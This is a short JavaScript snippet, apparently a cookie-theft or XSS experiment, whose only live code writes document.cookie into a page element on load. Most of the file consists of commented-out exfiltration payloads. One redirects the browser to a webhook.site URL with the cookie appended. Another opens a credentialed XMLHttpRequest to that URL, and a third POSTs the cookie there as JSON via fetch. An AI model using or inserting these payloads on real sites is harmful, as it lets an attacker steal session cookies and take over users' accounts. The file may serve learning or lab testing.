
  //var cookie = document.cookie;
  //alert(cookie);
  //document.location="https://webhook.site/ed28b5cc-045f-4048-b049-2880871dbaad?c="+document.cookie;

//const xhr = new XMLHttpRequest();
//xhr.open("GET", "https://webhook.site/ed28b5cc-045f-4048-b049-2880871dbaad", true);
//xhr.withCredentials = true;

const res = document.getElementById("res");

window.onload = () =>  {

  res.innerHTML = document.cookie
  
}
  
//fetch("https://webhook.site/ed28b5cc-045f-4048-b049-2880871dbaad", {
//  method: "POST",
//  headers: { "Content-Type": "application/json" },
//  body: JSON.stringify({ cookie: document.cookie }),
//});

//xhr.onreadystatechange = function () {
//  if (xhr.readyState === XMLHttpRequest.DONE) {
//    if (xhr.status === 200) {
//      console.log("Réponse :", xhr.responseText);
 //   } else {
//      console.error("Erreur HTTP :", xhr.status);
//    }
//  }
//};
